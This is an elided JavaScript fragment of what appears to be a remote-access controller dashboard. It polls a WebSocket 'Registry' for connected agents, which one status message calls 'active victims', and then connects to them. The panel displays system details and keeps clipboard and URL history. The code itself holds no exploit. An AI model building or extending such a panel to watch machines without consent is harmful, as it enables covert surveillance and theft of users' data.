...
document.addEventListener('DOMContentLoaded', () => {
    ...
    if (savedClientIP) {
        const input = document.getElementById("intro-ip-input");
...
function connectToRegistryServer(ip) {
    ...
    registrySocket = new WebSocket(wsUri);

    registrySocket.onopen = () => {
        console.log("Connected to Registry");
        if(statusText) statusText.innerText = "Connected! Fetching active victims...";
        registrySocket.send("TYPE:ADMIN");

        if(registryInterval) clearInterval(registryInterval);
        registryInterval = setInterval(() => {
            if(registrySocket.readyState === WebSocket.OPEN) {
                registrySocket.send("GET_DISCOVERED_CLIENTS");
            }
        }, 3000);
    };

    registrySocket.onmessage = (e) => {
        const data = e.data;
        if (data.startsWith("LIST_DISCOVERED")) {
            renderDiscoveredList(data);
        }
    };
    ...
    registrySocket.onclose = () => {
        ...
        if(registryInterval) clearInterval(registryInterval);
        if(statusText) statusText.innerText = "Disconnected from Registry.";
    };
    
    registrySocket.onerror = (err) => {
        console.error("Registry Error", err);
        if(statusText) statusText.innerText = "Error connecting to Registry.";
    };
}

function renderDiscoveredList(data) {
    ...
    if (victims.length === 0 || (victims.length === 1 && victims[0] === "")) {
        list.innerHTML = `
            <div class="scan-placeholder">
                ...
                <span>No active clients found via Registry.</span>
                <small>Make sure the Agent is running.</small>
            </div>`;
        if(typeof lucide !== 'undefined') lucide.createIcons();
        return;
    }
        ...
        item.innerHTML = `
            <div style="display:flex; align-items:center; gap:12px;">
                ...
                <div style="display:flex; flex-direction:column;">
                    <strong style="font-size:1rem; color:#334155;">${name}</strong>
                    <span style="font-size:0.75rem; color:#94a3b8">${ip} • ${os}</span>
                </div>
            </div>

            <button class="btn-gradient-blue" style="padding: 8px 20px; font-size:0.85rem; border-radius:50px;">
                Connect
            </button>
        `;
...
function connectToDirectTarget(ip, port) {
    if(registryInterval) clearInterval(registryInterval);
    if(registrySocket) { registrySocket.close(); registrySocket = null; }
...
function setConnectedState(isConnected) {
    ...
    if (isConnected) {
        if(areaDisconnected) areaDisconnected.classList.add("hidden");
        if(areaConnected) areaConnected.classList.remove("hidden");
        ...
        if(areaDisconnected) areaDisconnected.classList.remove("hidden");
        if(areaConnected) areaConnected.classList.add("hidden");
...
function resetDashboardState() {
    const els = {
        "sys-hostname": "---", "sys-os": "---", "status-ram": "---", 
        "status-batt": "---", "status-disk": "---", "status-procs": "---", "sys-uptime": "--:--:--"
    };
    for(let id in els) {
...
function addToHistory(type, url, textContent = "") {
    ...
    else if (type === 'clipboard') listId = 'clipboard-history-list'; 
...
function clearHistory(type) { 
    if(confirm("Clear all history for this section?")) {
        ...
        else if (type === 'clipboard') id = 'clipboard-history-list';
